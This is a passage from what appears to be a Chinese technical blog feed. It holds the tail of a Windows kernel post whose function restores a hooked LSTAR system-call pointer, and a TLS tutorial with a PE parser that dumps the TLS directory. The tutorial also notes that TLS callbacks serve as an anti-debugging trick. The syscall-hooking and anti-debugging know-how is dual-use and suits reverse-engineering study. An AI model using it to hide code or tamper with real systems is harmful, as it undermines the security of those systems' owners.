class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Unhook LSTAR</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">SHDestroyHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="keyword">if</span> (KiSystemCall64Ptr != <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// 有hook，DPC回调恢复原始LSTAR地址</span></span><br><span class="line">        <span class="built_in">KeGenericCallDpc</span>( SHpHookCallbackDPC, <span class="literal">NULL</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">        <span class="comment">// 取消钩子</span></span><br><span class="line">        KiSystemCall64Ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></center></center>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TLS</title>
      <link href="/2024/02/04/TLS/"/>
      <url>/2024/02/04/TLS/</url>
      
        <content type="html"><![CDATA[<h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><p>线程局部存储，TLS</p><p><img src="/.io//image-20230214145111183.png" alt="image-20230214145111183"></p><p>如何使用TLS</p><p>有静态方法和动态方法</p><p><img src="/.io//image-20230215013708036.png" alt="image-20230215013708036"></p><p>静态方法 把全局变量数据类型前添加 __declspec(thread) 关键字，同一变量在不同的线程中各自使用自己的那一份，不同的线程间不会互相影响</p><p>使用这种方法，生成的PE文件在节头中会有.tls头</p><p>动态方法 存放索引 使用一个普通的全局变量，在创建线程前创建一个独立的索引 __ v2&#x3D;TlsAlloc()，根据索引设置数组的值 TlsSetValue( __ v2, 0) ,使用时使用a &#x3D; TlsGetValue(__ v2)获取</p><p>理论上没有.tls头出现，但是测试失败</p><h1 id="TLS回调"><a href="#TLS回调" class="headerlink" title="TLS回调"></a>TLS回调</h1><p><img src="/.io//image-20230215013255890.png" alt="image-20230215013255890"></p><p><img src="/.io//image-20230215013357895.png" alt="image-20230215013357895"></p><p>调用约定为NTAPI，即_stdcall </p><p>只要有线程启动或销毁会自动调用线程回调，比EP进程初始化还要早（比主函数启动还早），许多逆向分析人员把这个特性用于反调试</p><h1 id="TLS目录"><a href="#TLS目录" class="headerlink" title="TLS目录"></a>TLS目录</h1><p>使用内存映射的方法进行分析 相当于系统自动申请内存，不用自己手动申请内存。获取内存映射句柄，使用MapViewOfFile获取虚拟地址位置  </p><p>都是文件粒度对齐</p><p>对大文件操作效率更高</p><p><img src="/.io//image-20230215014825488.png" alt="image-20230215014825488"></p><p>将内存粒度转换为文件粒度</p><p><img src="/.io//image-20230215015918708.png" alt="image-20230215015918708"></p><p><img src="/.io//image-20230215020146408.png" alt="image-20230215020146408"></p><p>DumpTlsDirectory是自己实现的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, </span></span></span><br><span class="line"><span class="params"><span class="function">LPBYTE ImageBase, DWORD Offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL IsWow64 = FALSE;</span><br><span class="line"><span class="comment">//判断PE文件的位数</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsOptionalHeaderPE32Plus</span>(ImageOptionalHeader, &amp;IsWow64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWow64 == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//x64</span></span><br><span class="line">PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p  \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_1</span><span class="params">()</span></span>;  <span class="comment">//文件粒度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_2</span><span class="params">()</span></span>;  <span class="comment">//内存粒度</span></span><br><span class="line"><span class="function">BOOL <span class="title">RtlImageDirectoryEntryToData</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, <span class="type">int</span> DirectoryIndex, PIMAGE_DATA_DIRECTORY ImageDataDirectory)</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">Rva2Offset</span><span class="params">(DWORD Rva, UINT_PTR ImageBaseAddress)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsOptionalHeaderPE32Plus</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, BOOL* IsWow64)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader,</span></span></span><br><span class="line"><span class="params"><span class="function">LPBYTE ImageBase, DWORD Offset)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory2</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD VirtualAddress)</span></span>;</span><br><span class="line"><span class="function">LONGLONG <span class="title">AlignmentData</span><span class="params">(LONGLONG OperateLength, LONGLONG AlignmentLength)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPEFile</span><span class="params">(LPVOID ImageBase, PIMAGE_NT_HEADERS&amp; ImageNtHeaders)</span></span>;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[],TCHAR *envp[])</span><br><span class="line">&#123;</span><br><span class="line">     <span class="built_in">setlocale</span>(LC_ALL,<span class="string">&quot;Chinese-simplified&quot;</span>);</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"> <span class="built_in">Sub_1</span>();  <span class="comment">//内存映射的方法分析TLS目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="built_in">Sub_2</span>();  <span class="comment">//文件读写的方法分析TLS目录</span></span><br><span class="line"> </span><br><span class="line"> _tprintf(_T(<span class="string">&quot;Input AnyKey To Exit\r\n&quot;</span>));</span><br><span class="line">    _gettchar();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR ImageName[MAX_PATH] = _T(<span class="string">&quot;Test.exe&quot;</span>);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;ImageName: %s \n&quot;</span>), ImageName);</span><br><span class="line"></span><br><span class="line">HANDLE FileHandle = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE MappingHandle = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_NT_HEADERS ImageNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD  Offset = <span class="number">0</span>;</span><br><span class="line">IMAGE_DATA_DIRECTORY ImageDataDirectory = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件并将其映射到内存中</span></span><br><span class="line">FileHandle = <span class="built_in">CreateFile</span>(ImageName, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据文件句柄创建内存映射对象获得内存映射句柄</span></span><br><span class="line">MappingHandle = <span class="built_in">CreateFileMapping</span>(FileHandle, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (MappingHandle == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateFileMapping() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">ImageBase = <span class="built_in">MapViewOfFile</span>(MappingHandle, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);     <span class="comment">//文件粒度对齐   </span></span><br><span class="line"><span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;MapViewOfFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//是否为有效的PE可执行文件</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsPEFile</span>(ImageBase, ImageNtHeaders))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;IsPEFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查看TLS目录</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">RtlImageDirectoryEntryToData</span>(&amp;ImageNtHeaders-&gt;OptionalHeader, IMAGE_DIRECTORY_ENTRY_TLS,&amp;ImageDataDirectory))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetTlsDirectoryRVA() Error\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将内存粒度转换成文件粒度</span></span><br><span class="line">Offset = <span class="built_in">Rva2Offset</span>(ImageDataDirectory.VirtualAddress, (UINT_PTR)ImageBase);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Offset&lt;=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Rva2Offset() Error\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//显示TLS目录信息</span></span><br><span class="line"><span class="built_in">DumpTlsDirectory</span>(&amp;ImageNtHeaders-&gt;OptionalHeader, (LPBYTE)ImageBase, Offset);</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄</span></span><br><span class="line"><span class="keyword">if</span> (ImageBase != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">UnmapViewOfFile</span>(ImageBase);</span><br><span class="line">ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (MappingHandle != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(MappingHandle);</span><br><span class="line">MappingHandle = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FileHandle != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(FileHandle);</span><br><span class="line">FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line">&#125;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Please Input Anykey to Continue\r\n&quot;</span>));</span><br><span class="line">_gettchar();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPEFile</span><span class="params">(LPVOID ImageBase, PIMAGE_NT_HEADERS&amp; ImageNtHeaders)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line"><span class="keyword">if</span> (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">ImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ImageDosHeader + (DWORD_PTR)ImageDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">RtlImageDirectoryEntryToData</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader,<span class="type">int</span> DirectoryIndex,PIMAGE_DATA_DIRECTORY ImageDataDirectory)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL IsWow64 = FALSE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsOptionalHeaderPE32Plus</span>(ImageOptionalHeader, &amp;IsWow64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWow64==FALSE)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">PIMAGE_OPTIONAL_HEADER64 ImageOptionalHeader64 = (PIMAGE_OPTIONAL_HEADER64)ImageOptionalHeader;</span><br><span class="line"><span class="built_in">memcpy</span>(ImageDataDirectory, &amp;ImageOptionalHeader64-&gt;DataDirectory[DirectoryIndex], <span class="built_in">sizeof</span>(IMAGE_DATA_DIRECTORY));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 ImageOptionalHeader32 = (PIMAGE_OPTIONAL_HEADER32)ImageOptionalHeader;</span><br><span class="line"><span class="built_in">memcpy</span>(ImageDataDirectory, &amp;ImageOptionalHeader32-&gt;DataDirectory[DirectoryIndex], <span class="built_in">sizeof</span>(IMAGE_DATA_DIRECTORY));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ImageDataDirectory-&gt;VirtualAddress == <span class="number">0</span>) &amp;&amp; (ImageDataDirectory-&gt;Size == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//这个目录不存在</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((ImageDataDirectory-&gt;VirtualAddress == <span class="number">0</span>) || (ImageDataDirectory-&gt;Size == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//数据目录中的数据不一致</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ImageDataDirectory-&gt;Size &lt; (IsWow64 